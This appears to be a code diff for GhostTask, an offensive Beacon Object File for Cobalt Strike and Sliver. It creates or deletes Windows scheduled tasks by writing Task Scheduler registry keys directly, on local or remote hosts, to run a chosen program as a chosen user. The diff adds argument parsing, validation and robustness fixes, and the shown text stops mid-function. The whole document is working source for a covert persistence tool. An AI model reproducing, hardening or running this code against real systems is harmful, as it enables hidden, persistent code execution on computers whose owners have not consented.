@@ -1,5 +1,6 @@
 #include <windows.h>
 #include "ghost_task.h"
+#include "safety_checks.h"
 
 #define GUIDSIZE 38
 #define COPY_DATA(dest, src, size) \
@@ -232,7 +233,7 @@ BOOL ParseArguments(datap *parser, Arguments *arguments)
         {
             if (arglen == i)
             {
-                BeaconPrintf(CALLBACK_ERROR, "No %s provided.", missingArgs[i]);
+                BeaconPrintf(CALLBACK_ERROR, "No %s provided.", missingArgs[j]);
                 return false;
             }
         }
@@ -328,6 +329,242 @@ BOOL ParseArguments(datap *parser, Arguments *arguments)
         BeaconPrintf(CALLBACK_ERROR, "Unknown command '%s'.", operation);
         return FALSE;
     }
+    return TRUE;
+}
+
+static BOOL IsEmptyArgument(const char *value)
+{
+    return value == NULL || value[0] == '\0';
+}
+
+static char LowerAscii(char value)
+{
+    if (value >= 'A' && value <= 'Z')
+        return value + ('a' - 'A');
+    return value;
+}
+
+static BOOL EqualsIgnoreCase(const char *value, const char *expected)
+{
+    int index = 0;
+    if (value == NULL || expected == NULL)
+        return FALSE;
+    while (value[index] != '\0' && expected[index] != '\0')
+    {
+        if (LowerAscii(value[index]) != LowerAscii(expected[index]))
+            return FALSE;
+        index++;
+    }
+    return value[index] == '\0' && expected[index] == '\0';
+}
+
+static BOOL ExtractSliverString(datap *parser, const char *name, unsigned int maxContentLength, char **value)
+{
+    if (!GhostTaskExtractSliverField(parser, maxContentLength, value))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Invalid %s field in GhostTask argument buffer.", name);
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static BOOL ParsePositiveDecimal(const char *value, int *result)
+{
+    int parsed = 0;
+    int digit = 0;
+    if (IsEmptyArgument(value))
+        return FALSE;
+    while (*value != '\0')
+    {
+        if (*value < '0' || *value > '9')
+            return FALSE;
+        digit = *value - '0';
+        if (parsed > (2147483647 - digit) / 10)
+            return FALSE;
+        parsed = parsed * 10 + digit;
+        value++;
+    }
+    if (parsed <= 0)
+        return FALSE;
+    *result = parsed;
+    return TRUE;
+}
+
+static BOOL ParseTime(const char *value, int *hour, int *minute)
+{
+    if (value == NULL || strlen(value) != 5 || value[2] != ':' ||
+        value[0] < '0' || value[0] > '9' || value[1] < '0' || value[1] > '9' ||
+        value[3] < '0' || value[3] > '9' || value[4] < '0' || value[4] > '9')
+        return FALSE;
+    *hour = (value[0] - '0') * 10 + (value[1] - '0');
+    *minute = (value[3] - '0') * 10 + (value[4] - '0');
+    return *hour <= 23 && *minute <= 59;
+}
+
+static BOOL ParseDays(const char *value, unsigned short *dayBitmap)
+{
+    int start = 0;
+    int end = 0;
+    int dayIndex = 0;
+    int tokenLength = 0;
+    BOOL matched = FALSE;
+
+    *dayBitmap = 0;
+    if (IsEmptyArgument(value))
+        return FALSE;
+    while (value[start] != '\0')
+    {
+        end = start;
+        while (value[end] != '\0' && value[end] != ',')
+            end++;
+        tokenLength = end - start;
+        if (tokenLength == 0)
+            return FALSE;
+
+        matched = FALSE;
+        for (dayIndex = 0; dayIndex < 7; dayIndex++)
+        {
+            if (strlen(DAYS[dayIndex]) == tokenLength)
+            {
+                int character = 0;
+                matched = TRUE;
+                for (character = 0; character < tokenLength; character++)
+                {
+                    if (LowerAscii(value[start + character]) != DAYS[dayIndex][character])
+                    {
+                        matched = FALSE;
+                        break;
+                    }
+                }
+                if (matched)
+                {
+                    *dayBitmap |= (1 << dayIndex);
+                    break;
+                }
+            }
+        }
+        if (!matched)
+            return FALSE;
+        if (value[end] == '\0')
+            break;
+        start = end + 1;
+        if (value[start] == '\0')
+            return FALSE;
+    }
+    return *dayBitmap != 0;
+}
+
+// Sliver packs manifest arguments in declaration order and cannot prepend the
+// variable argument count used by the CNA. Parse a fixed nine-string layout so
+// every operation has one deterministic wire format:
+// computer, operation, task, program, argument, user, schedule, time, day.
+BOOL ParseSliverArguments(datap *parser, Arguments *arguments)
+{
+    char *computerName = NULL;
+    char *operation = NULL;
+    char *taskName = NULL;
+    char *program = NULL;
+    char *argument = NULL;
+    char *userName = NULL;
+    char *scheduleType = NULL;
+    char *time = NULL;
+    char *day = NULL;
+
+    memset(arguments, 0, sizeof(*arguments));
+    if (!ExtractSliverString(parser, "computer-name", 255, &computerName) ||
+        !ExtractSliverString(parser, "operation", 255, &operation) ||
+        !ExtractSliverString(parser, "task-name", 190, &taskName) ||
+        !ExtractSliverString(parser, "program", 255, &program) ||
+        !ExtractSliverString(parser, "program-arguments", 255, &argument) ||
+        !ExtractSliverString(parser, "username", 255, &userName) ||
+        !ExtractSliverString(parser, "schedule-type", 255, &scheduleType) ||
+        !ExtractSliverString(parser, "time", 255, &time) ||
+        !ExtractSliverString(parser, "days", 255, &day) ||
+        !GhostTaskSliverBufferConsumed(parser))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Invalid or trailing GhostTask argument data.");
+        return FALSE;
+    }
+
+    if (IsEmptyArgument(computerName) || IsEmptyArgument(operation) || IsEmptyArgument(taskName))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Computer name, operation, and task name are required.");
+        return FALSE;
+    }
+    arguments->computerName = EqualsIgnoreCase(computerName, "localhost") ? NULL : computerName;
+    arguments->taskName = taskName;
+
+    if (EqualsIgnoreCase(operation, "delete"))
+    {
+        if (!IsEmptyArgument(program) || !IsEmptyArgument(argument) ||
+            !IsEmptyArgument(userName) || !IsEmptyArgument(scheduleType) ||
+            !IsEmptyArgument(time) || !IsEmptyArgument(day))
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Delete does not accept add-only arguments.");
+            return FALSE;
+        }
+        arguments->taskOperation = TaskDeleteOperation;
+        return TRUE;
+    }
+    if (!EqualsIgnoreCase(operation, "add"))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Unknown task operation '%s'.", operation);
+        return FALSE;
+    }
+    if (IsEmptyArgument(program) || IsEmptyArgument(userName) || IsEmptyArgument(scheduleType))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Add requires program, username, and schedule type.");
+        return FALSE;
+    }
+
+    arguments->taskOperation = TaskAddOperation;
+    arguments->program = program;
+    arguments->argument = argument;
+    arguments->userName = userName;
+
+    if (EqualsIgnoreCase(scheduleType, "second"))
+    {
+        if (!ParsePositiveDecimal(time, &arguments->second) || !IsEmptyArgument(day))
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Second schedule requires positive decimal time and no days.");
+            return FALSE;
+        }
+        arguments->scheduleType = 0;
+    }
+    else if (EqualsIgnoreCase(scheduleType, "daily"))
+    {
+        if (!ParseTime(time, &arguments->hour, &arguments->minute) || !IsEmptyArgument(day))
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Daily schedule requires HH:MM time and no days.");
+            return FALSE;
+        }
+        arguments->scheduleType = 1;
+    }
+    else if (EqualsIgnoreCase(scheduleType, "weekly"))
+    {
+        if (!ParseTime(time, &arguments->hour, &arguments->minute) ||
+            !ParseDays(day, &arguments->dayBitmap))
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Weekly schedule requires HH:MM time and exact comma-separated weekdays.");
+            return FALSE;
+        }
+        arguments->scheduleType = 2;
+    }
+    else if (EqualsIgnoreCase(scheduleType, "logon"))
+    {
+        if (!IsEmptyArgument(time) || !IsEmptyArgument(day))
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Logon schedule does not accept time or days.");
+            return FALSE;
+        }
+        arguments->scheduleType = 3;
+    }
+    else
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Unknown schedule type '%s'.", scheduleType);
+        return FALSE;
+    }
+
     return TRUE;
 }
 #else
@@ -489,14 +726,14 @@ bool ParseArguments(char **args, int arglen, Arguments *arguments)
 
 BOOL CheckSystem()
 {
-
     HANDLE hToken = NULL;
     UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
     PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
-    ULONG cbTokenUser;
+    ULONG cbTokenUser = 0;
     SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
-    PSID pSystemSid;
-    BOOL bSystem;
+    PSID pSystemSid = NULL;
+    BOOL bSystem = FALSE;
+
     // Get thread token, if failed then try process token
     if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken))
     {
@@ -505,31 +742,35 @@ BOOL CheckSystem()
             if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
             {
                 BeaconPrintf(CALLBACK_ERROR, "Error calling OpenProcessToken. Error code:0x%x", GetLastError());
-                return false;
+                goto check_system_exit;
             }
         }
-        
     }
     if (hToken == NULL)
     {
         BeaconPrintf(CALLBACK_ERROR, "No token found. Error code:0x%x", GetLastError());
-        return false;
+        goto check_system_exit;
     }
 
     if (!GetTokenInformation(hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser))
     {
         BeaconPrintf(CALLBACK_ERROR, "Error calling GetTokenInformation. Error code:0x%x", GetLastError());
-        return false;
+        goto check_system_exit;
     }
 
     if (!AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid))
     {
         BeaconPrintf(CALLBACK_ERROR, "Error calling AllocateAndInitializeSid. Error code:0x%x", GetLastError());
-        return false;
+        goto check_system_exit;
     }
 
     bSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
-    FreeSid(pSystemSid);
+
+check_system_exit:
+    if (pSystemSid != NULL)
+        FreeSid(pSystemSid);
+    if (hToken != NULL)
+        KERNEL32$CloseHandle(hToken);
     return bSystem;
 }
 
@@ -569,22 +810,40 @@ REG_ERROR_CODE OpenKeyHandle(HKEY *hKey, LPCSTR computerName, ACCESS_MASK desire
     return REG_SUCCESS;
 }
 
-char *GetExistingTaskGuid(LPCSTR computerName, LPCSTR taskName)
+TASK_GUID_RESULT GetExistingTaskGuid(LPCSTR computerName, LPCSTR taskName, char **guid)
 {
     DWORD dwRet = 0;
     DWORD type = 0;
     DWORD size = 0;
     char *treePath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\";
     int treePathSize = strlen(treePath);
-    char *treeKey = (char *)malloc(treePathSize + strlen(taskName) + 1);
-    sprintf(treeKey, "%s%s", treePath, taskName);
+    char *treeKey = NULL;
     HKEY key = NULL;
     char *valueData = NULL;
 
+    if (guid == NULL)
+        return TaskGuidInvalid;
+    *guid = NULL;
+
+    if (!GhostTaskHasSafeTaskName(taskName))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Task name must be a safe 1-190 byte registry path.");
+        return TaskGuidInvalid;
+    }
+    treeKey = (char *)malloc(treePathSize + strlen(taskName) + 1);
+    if (treeKey == NULL)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
+        return TaskGuidInvalid;
+    }
+    sprintf(treeKey, "%s%s", treePath, taskName);
+
     REG_ERROR_CODE regRetCode = OpenKeyHandle(&key, computerName, KEY_READ, treeKey);
     free(treeKey);
+    if (regRetCode == OPEN_KEY_FAIL)
+        return TaskGuidAbsent;
     if (regRetCode != REG_SUCCESS)
-        return NULL;
+        return TaskGuidInvalid;
 
     dwRet = RegQueryValueExA(key, "Id", NULL, &type, NULL, &size);
     if (dwRet != ERROR_SUCCESS)
@@ -593,17 +852,20 @@ char *GetExistingTaskGuid(LPCSTR computerName, LPCSTR taskName)
         goto exit;
     }
 
-    if (type == REG_SZ || type == REG_EXPAND_SZ || type == REG_MULTI_SZ)
-        size += 2;
+    if (type != REG_SZ || size != GUIDSIZE + 1)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Task Id must be an exact NUL-terminated GUID string.");
+        goto exit;
+    }
 
     valueData = (char *)malloc(size);
     if (!valueData)
         goto exit;
 
     dwRet = RegQueryValueExA(key, "Id", NULL, &type, (LPBYTE)valueData, &size);
-    if (dwRet != ERROR_SUCCESS)
+    if (dwRet != ERROR_SUCCESS || type != REG_SZ || !GhostTaskIsValidGuid(valueData, size))
     {
-        BeaconPrintf(CALLBACK_ERROR, "Error calling RegQueryValueExA. Error code:0x%x\n", dwRet);
+        BeaconPrintf(CALLBACK_ERROR, "Task Id is not a valid GUID string. Error code:0x%x\n", dwRet);
         free(valueData);
         valueData = NULL;
     }
@@ -611,7 +873,10 @@ char *GetExistingTaskGuid(LPCSTR computerName, LPCSTR taskName)
 exit:
     if (key)
         RegCloseKey(key);
-    return valueData;
+    if (valueData == NULL)
+        return TaskGuidInvalid;
+    *guid = valueData;
+    return TaskGuidFound;
 }
 /* ---------------------------------------------------------------------------Add func start--------------------------------------------------------------------------------------------------------------------------------*/
 
@@ -635,19 +900,27 @@ char *GetProductName(LPCSTR computerName)
         goto exit;
     }
 
-    if (type == REG_SZ || type == REG_EXPAND_SZ || type == REG_MULTI_SZ)
-        size += 2;
+    if ((type != REG_SZ && type != REG_EXPAND_SZ) || size == 0 || size > 4096)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "ProductName has an invalid registry type or size.");
+        goto exit;
+    }
 
-    valueData = (char *)malloc(size);
+    valueData = (char *)malloc(size + 1);
     if (!valueData)
         goto exit;
+    memset(valueData, 0, size + 1);
 
     dwRet = RegQueryValueExA(key, "ProductName", NULL, &type, (LPBYTE)valueData, &size);
-    if (dwRet != ERROR_SUCCESS)
+    if (dwRet != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ) || size > 4096)
     {
         BeaconPrintf(CALLBACK_ERROR, "Error calling RegQueryValueExA. Error code:0x%x\n", dwRet);
         free(valueData);
         valueData = NULL;
+    }
+    else
+    {
+        valueData[size] = '\0';
     }
 
 exit:
@@ -695,7 +968,7 @@ REG_ERROR_CODE AddKey(LPCSTR computerName, LPCSTR keyName)
     return REG_SUCCESS;
 }
 
-void AddValue(HKEY hKey, LPCSTR computerName, LPCSTR keyName, LPCSTR valueName, DWORD dwRegType, DWORD dataLength, LPBYTE bdata, bool overwrite)
+BOOL AddValue(HKEY hKey, LPCSTR computerName, LPCSTR keyName, LPCSTR valueName, DWORD dwRegType, DWORD dataLength, LPBYTE bdata, bool overwrite)
 {
     const char *hiveRootString = "HKLM";
     const char *rootSeparator = (strlen(keyName) == 0) ? "" : "\\";
@@ -709,20 +982,27 @@ void AddValue(HKEY hKey, LPCSTR computerName, LPCSTR keyName, LPCSTR valueName, 
     const char *preposition = (lret == ERROR_SUCCESS) ? "in" : "to";
 
     if (lret == ERROR_SUCCESS && !overwrite)
-        return;
+        return TRUE;
     lret = RegSetValueExA(hKey, valueName, 0, dwRegType, bdata, dataLength);
 
     if (lret != ERROR_SUCCESS)
     {
         BeaconPrintf(CALLBACK_ERROR, "Failed to %s value '%s' %s '%s%s%s%s%s' [error %d].", failOperationString, valueName, preposition, computerString, computerNameSeparator, hiveRootString, rootSeparator, keyName, lret);
-        return;
+        return FALSE;
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "%s value '%s' %s '%s%s%s%s%s'", successOperationString, valueName, preposition, computerString, computerNameSeparator, hiveRootString, rootSeparator, keyName);
+    return TRUE;
 }
 
-void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR argument, LPCSTR userName, unsigned short scheduleType, int hour, int minute, int second, unsigned short dayBitmap)
+BOOL AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR argument, LPCSTR userName, unsigned short scheduleType, int hour, int minute, int second, unsigned short dayBitmap)
 {
+    if (!GhostTaskHasSafeTaskName(taskName))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Task name must be a safe 1-190 byte registry path.");
+        return FALSE;
+    }
+
     unsigned char author[] = {0x41, 0x00, 0x75, 0x00, 0x74, 0x00, 0x68, 0x00, 0x6f, 0x00, 0x72, 0x00};
     char *taskPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\";
     char *tree = "Tree\\";
@@ -738,17 +1018,17 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
     char *treeKey = (char *)malloc(taskPathSize + treeSize + taskNameSize + 1);
     char *plainKey = NULL, *taskKey = NULL, *fullGuid = NULL, *productName = NULL;
     PSID targetSid = NULL;
-    DWORD domainSize, sizeOfSid = 0;
+    DWORD domainSize = 0, sizeOfSid = 0;
     LPSTR domainName = NULL;
-    bool userFound, legacyActionVersion = false;
-    SID_NAME_USE peUse;
-    FILETIME emptyTime;
-    AlignedByte empty;
-    TSTIME emptyTstime;
-    OSVERSIONINFOEXA winVer;
-    FILETIME ft;
-    SYSTEMTIME st;
-    char dateString[20];
+    bool userFound = false, legacyActionVersion = false;
+    SID_NAME_USE peUse = SidTypeUnknown;
+    FILETIME emptyTime = {0};
+    AlignedByte empty = {0};
+    TSTIME emptyTstime = {0};
+    OSVERSIONINFOEXA winVer = {0};
+    FILETIME ft = {0};
+    SYSTEMTIME st = {0};
+    char dateString[20] = {0};
     LPCSTR workingDirectory = "";
     LONGLONG index = 3;
     wchar_t cmd_w[256] = {0};
@@ -757,28 +1037,38 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
     int sizeOfCmd = strlen(cmd);
     int sizeOfArgument = strlen(argument);
     int sizeOfWorkingDirectory = strlen(workingDirectory);
-    DWORD totalActionSize;
+    int cmdWideChars = 0;
+    int argumentWideChars = 0;
+    int workingDirectoryWideChars = 0;
+    DWORD totalActionSize = 0;
     Actions *action = (Actions *)malloc(sizeof(Actions));
     BYTE *actionRaw = NULL;
-    DynamicInfo dynamicInfo;
-    SYSTEMTIME startBoundary;
-    FILETIME ftStartBoundary;
-    TSTIME tsStartBoundary;
+    DynamicInfo dynamicInfo = {0};
+    SYSTEMTIME startBoundary = {0};
+    FILETIME ftStartBoundary = {0};
+    TSTIME tsStartBoundary = {0};
     PSECURITY_DESCRIPTOR pSd = NULL;
-    ULONG sdLength;
+    ULONG sdLength = 0;
     HKEY hKeyTree = NULL;
     HKEY hKeyTask = NULL;
-    Header header;
+    Header header = {0};
     Trigger12 *trigger12 = NULL;
     Trigger28 *trigger28 = NULL;
-    JobBucket12 jobBucket12;
-    UserInfo12 userInfo12;
-    JobBucket28 jobBucket28;
-    UserInfo28 userInfo28;
-    OptionalSettings optionalSettings;
-    TimeTrigger timeTrigger;
-    LogonTrigger logonTrigger;
-    AlignedByte version, localized, skipUser, skipSid, enable;
+    JobBucket12 jobBucket12 = {0};
+    UserInfo12 userInfo12 = {0};
+    JobBucket28 jobBucket28 = {0};
+    UserInfo28 userInfo28 = {0};
+    OptionalSettings optionalSettings = {0};
+    TimeTrigger timeTrigger = {0};
+    LogonTrigger logonTrigger = {0};
+    AlignedByte version = {0}, localized = {0}, skipUser = {0}, skipSid = {0}, enable = {0};
+    BOOL success = FALSE;
+
+    if (uriPath == NULL || treeKey == NULL || action == NULL)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
+        goto exit;
+    }
 
     empty.value = 0;
     memset(empty.padding, 0, 7);
@@ -786,12 +1076,22 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
     emptyTime.dwHighDateTime = 0;
     emptyTstime.isLocalized = empty;
     emptyTstime.time = emptyTime;
-    MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, cmd, -1, cmd_w, sizeOfCmd);
-    MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, argument, -1, argument_w, sizeOfArgument);
-    MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, workingDirectory, -1, workingDirectory_w, sizeOfWorkingDirectory);
-    sizeOfCmd = sizeOfCmd * 2;
-    sizeOfArgument = sizeOfArgument * 2;
-    sizeOfWorkingDirectory = sizeOfWorkingDirectory * 2;
+    cmdWideChars = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, cmd, -1, NULL, 0);
+    argumentWideChars = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, argument, -1, NULL, 0);
+    workingDirectoryWideChars = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, workingDirectory, -1, NULL, 0);
+    if (cmdWideChars <= 0 || cmdWideChars > 256 ||
+        argumentWideChars <= 0 || argumentWideChars > 256 ||
+        workingDirectoryWideChars <= 0 || workingDirectoryWideChars > 256 ||
+        MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, cmd, -1, cmd_w, 256) != cmdWideChars ||
+        MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, argument, -1, argument_w, 256) != argumentWideChars ||
+        MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, workingDirectory, -1, workingDirectory_w, 256) != workingDirectoryWideChars)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Task action contains invalid UTF-8 or exceeds 255 UTF-16 characters.");
+        goto exit;
+    }
+    sizeOfCmd = (cmdWideChars - 1) * sizeof(wchar_t);
+    sizeOfArgument = (argumentWideChars - 1) * sizeof(wchar_t);
+    sizeOfWorkingDirectory = (workingDirectoryWideChars - 1) * sizeof(wchar_t);
     startBoundary.wYear = 1992;
     startBoundary.wMonth = 5;
     startBoundary.wDay = 1;
@@ -834,6 +1134,7 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
 
         userFound = LookupAccountNameA(NULL, userName, targetSid, &sizeOfSid, domainName, &domainSize, &peUse);
         free(domainName);
+        domainName = NULL;
     }
 
     if (!userFound)
@@ -841,16 +1142,32 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
         BeaconPrintf(CALLBACK_ERROR, "Target user not found. Error code: 0x%x", GetLastError());
         goto exit;
     }
+    if (!GhostTaskHasSupportedSidSize(sizeOfSid))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Unsupported SID size %lu; GhostTask supports only 12-byte and 28-byte serialized layouts.", sizeOfSid);
+        goto exit;
+    }
 
-    // Get existing GUID or generate new GUID
-    fullGuid = GetExistingTaskGuid(computerName, taskName);
-    if (!fullGuid)
+    // Get existing GUID or generate a new one only when the task tree is absent.
+    TASK_GUID_RESULT guidResult = GetExistingTaskGuid(computerName, taskName, &fullGuid);
+    if (guidResult == TaskGuidInvalid)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Existing task metadata is inaccessible or malformed.");
+        goto exit;
+    }
+    if (guidResult == TaskGuidAbsent)
     {
         GUID uuid = {0};
         RPC_CSTR szRPCGuid = NULL;
         if (UuidCreate(&uuid) == RPC_S_OK && UuidToStringA(&uuid, &szRPCGuid) == RPC_S_OK && szRPCGuid)
         {
             fullGuid = (char *)malloc(GUIDSIZE + 1);
+            if (fullGuid == NULL)
+            {
+                RpcStringFreeA(&szRPCGuid);
+                BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
+                goto exit;
+            }
             sprintf(fullGuid, "{%s}", szRPCGuid);
             RpcStringFreeA(&szRPCGuid);
             _strupr(fullGuid);
@@ -865,6 +1182,11 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
     // Update GUID path
     plainKey = (char *)malloc(taskPathSize + plainSize + GUIDSIZE + 1);
     taskKey = (char *)malloc(taskPathSize + taskSize + GUIDSIZE + 1);
+    if (plainKey == NULL || taskKey == NULL)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
+        goto exit;
+    }
     sprintf(plainKey, "%s%s%s", taskPath, plain, fullGuid);
     sprintf(taskKey, "%s%s%s", taskPath, task, fullGuid);
 
@@ -884,6 +1206,11 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
 
     totalActionSize = sizeof(short) + sizeof(DWORD) + sizeOfAuthor + sizeof(short) + sizeof(DWORD) + sizeof(DWORD) + sizeOfCmd + sizeof(DWORD) + sizeOfArgument + sizeof(DWORD) + sizeOfWorkingDirectory + sizeof(short);
     actionRaw = (BYTE *)malloc(totalActionSize);
+    if (actionRaw == NULL)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
+        goto exit;
+    }
     BYTE *ptr = actionRaw;
     COPY_DATA(ptr, &action->version, sizeof(short));
     COPY_DATA(ptr, &action->sizeOfAuthor, sizeof(DWORD));
@@ -972,6 +1299,11 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
     {
         trigger12 = (Trigger12 *)malloc(sizeof(Trigger12) + sizeof(LogonTrigger));
         trigger28 = (Trigger28 *)malloc(sizeof(Trigger28) + sizeof(LogonTrigger));
+        if (trigger12 == NULL || trigger28 == NULL)
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
+            goto exit;
+        }
         logonTrigger.magic = 0xaaaa;
         logonTrigger.unknown0 = 0;
         logonTrigger.startBoundary = emptyTstime;
@@ -995,6 +1327,11 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
     {
         trigger12 = (Trigger12 *)malloc(sizeof(Trigger12) + sizeof(TimeTrigger));
         trigger28 = (Trigger28 *)malloc(sizeof(Trigger28) + sizeof(TimeTrigger));
+        if (trigger12 == NULL || trigger28 == NULL)
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
+            goto exit;
+        }
         timeTrigger.magic = 0xdddd;
         timeTrigger.unknown0 = 0;
         timeTrigger.endBoundary = emptyTstime;
@@ -1038,6 +1375,12 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
         timeTrigger.pad2 = 0;
         timeTrigger.triggerId = 0x4848484800000000;
     }
+
+    header.endBoundary = emptyTstime;
+    if (scheduleType == 3)
+        header.startBoundary = emptyTstime;
+    else
+        header.startBoundary = timeTrigger.startBoundary;
 
     if (sizeOfSid == 12)
     {
@@ -1103,7 +1446,17 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
     }
 
     // Initialize security descriptor
-    ConvertStringSecurityDescriptorToSecurityDescriptorA("O:BAG:SYD:", 1, &pSd, &sdLength);
+#ifdef BOF
+    ConvertStringSecurityDescriptorToSecurityDescriptorA_t convertSecurityDescriptor = ConvertStringSecurityDescriptorToSecurityDescriptorA;
+    if (convertSecurityDescriptor == NULL ||
+        !convertSecurityDescriptor("O:BAG:SYD:", 1, &pSd, &sdLength))
+#else
+    if (!ConvertStringSecurityDescriptorToSecurityDescriptorA("O:BAG:SYD:", 1, &pSd, &sdLength))
+#endif
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Unable to create the scheduled-task security descriptor. Error code: 0x%x", GetLastError());
+        goto exit;
+    }
 
     BeaconPrintf(CALLBACK_OUTPUT, "Execution Log:\n");
     // Create scheduled task subkey
@@ -1129,37 +1482,59 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
     }
 
     // Add values for task tree
-    AddValue(hKeyTree, computerName, treeKey, "Index", 0x4, 4, (LPBYTE)&index, false);
-    AddValue(hKeyTree, computerName, treeKey, "Id", 0x1, strlen(fullGuid) + 1, (LPBYTE)fullGuid, false);
-    AddValue(hKeyTree, computerName, treeKey, "SD", REG_BINARY, sdLength, (LPBYTE)pSd, false);
+    if (!AddValue(hKeyTree, computerName, treeKey, "Index", 0x4, 4, (LPBYTE)&index, false) ||
+        !AddValue(hKeyTree, computerName, treeKey, "Id", 0x1, strlen(fullGuid) + 1, (LPBYTE)fullGuid, false) ||
+        !AddValue(hKeyTree, computerName, treeKey, "SD", REG_BINARY, sdLength, (LPBYTE)pSd, false))
+        goto exit;
 
     // Add values for Task GUID
-    AddValue(hKeyTask, computerName, taskKey, "Author", 0x1, strlen(userName) + 1, (char *)userName, false);
-    AddValue(hKeyTask, computerName, taskKey, "Path", 0x1, strlen(uriPath) + 1, (char *)uriPath, false);
-    AddValue(hKeyTask, computerName, taskKey, "URI", 0x1, strlen(uriPath) + 1, (char *)uriPath, false);
-    AddValue(hKeyTask, computerName, taskKey, "Date", 0x1, strlen(dateString) + 1, (char *)dateString, false);
+    if (!AddValue(hKeyTask, computerName, taskKey, "Author", 0x1, strlen(userName) + 1, (char *)userName, false) ||
+        !AddValue(hKeyTask, computerName, taskKey, "Path", 0x1, strlen(uriPath) + 1, (char *)uriPath, false) ||
+        !AddValue(hKeyTask, computerName, taskKey, "URI", 0x1, strlen(uriPath) + 1, (char *)uriPath, false) ||
+        !AddValue(hKeyTask, computerName, taskKey, "Date", 0x1, strlen(dateString) + 1, (char *)dateString, false))
+        goto exit;
 
     if (legacyActionVersion)
-        AddValue(hKeyTask, computerName, taskKey, "Actions", REG_BINARY, totalActionSize - 2, (LPBYTE)actionRaw, true);
+    {
+        if (!AddValue(hKeyTask, computerName, taskKey, "Actions", REG_BINARY, totalActionSize - 2, (LPBYTE)actionRaw, true))
+            goto exit;
+    }
     else
-        AddValue(hKeyTask, computerName, taskKey, "Actions", REG_BINARY, totalActionSize, (LPBYTE)actionRaw, true);
+    {
+        if (!AddValue(hKeyTask, computerName, taskKey, "Actions", REG_BINARY, totalActionSize, (LPBYTE)actionRaw, true))
+            goto exit;
+    }
 
-    AddValue(hKeyTask, computerName, taskKey, "DynamicInfo", REG_BINARY, sizeof(DynamicInfo), (LPBYTE)&dynamicInfo, false);
+    if (!AddValue(hKeyTask, computerName, taskKey, "DynamicInfo", REG_BINARY, sizeof(DynamicInfo), (LPBYTE)&dynamicInfo, false))
+        goto exit;
     if (sizeOfSid == 12)
     {
